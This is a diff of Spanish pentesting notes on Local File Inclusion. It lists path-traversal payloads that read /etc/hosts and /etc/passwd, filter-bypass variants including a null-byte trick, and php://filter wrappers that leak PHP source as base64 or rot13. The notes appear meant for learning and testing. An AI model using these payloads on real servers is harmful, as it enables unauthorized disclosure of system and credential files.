@@ -6,13 +6,20 @@ En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de 
 
 Ejemplo de LFI:
 
-```
-http://IP?filename=/etc/host //no esta sanetizado
-?filename=../../../../../../etc/hosts // sanetizado con filtro de busqueda en la ruta /var/www/html
-?filename?....//....//....//....//....//etc/hosts // en caso de que ../ sea remplazada por un caracter vacio
-?filename?../../../../../etc//./hosts // en caso de que este sanetizada la ruta ej(/etc/hosts, /etc/passwd) se ponen dos barras // o /./ y sigue funcionando
-?filename?../../../../../etc/passwd%00 para persiones de php antiguas
-```
+<pre><code>http://IP?filename=/etc/host 
+
+?filename=../../../../../../etc/hosts 
+// sanetizado con filtro de busqueda en la ruta /var/www/html
+
+?filename?....//....//....//....//....//etc/hosts 
+// en caso de que ../ sea remplazada por un caracter vacio
+
+?filename?../../../../../etc//./hosts 
+// en caso de que este filtrado por la ruta ej(/etc/hosts, /etc/passwd) se ponen dos barras // o /./ y sigue funcionando
+<strong>
+</strong><strong>?filename?../../../../../etc/passwd%00 
+</strong><strong>//para versiones de php antiguas
+</strong></code></pre>
 
 ### Uso de filtro/wrappers
 
@@ -21,10 +28,13 @@ http://IP?filename=/etc/host //no esta sanetizado
 ```
 // Convierte el contenido en base64
 php://filter/convert.base64-encode/resource=secret.php
+
 // Leer contenido en Base64
 echo -n "PD9waHAKCS8vTm8gZGViZXJpYXMgcG9kZXIgdmVybWUgZGFkbyBxdWUgZXN0ZSBjb2RpZ28gZGViZXJpYSBkZSBzZXIgaW50ZXJwcmV0YWRvCgllY2hvICJIb2xhIHF1ZSB0YWwiOwo/Pgo=" | base64 -d
+
 // Convierte el contenido en cifrado cesar//rotacion de 13 posiciones en las letras del abecedario
 php://filter/read=string.rot13/resource=secret.php
+
 // Leer el contenido en cifrado cesar
 cat data | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]'
 ```
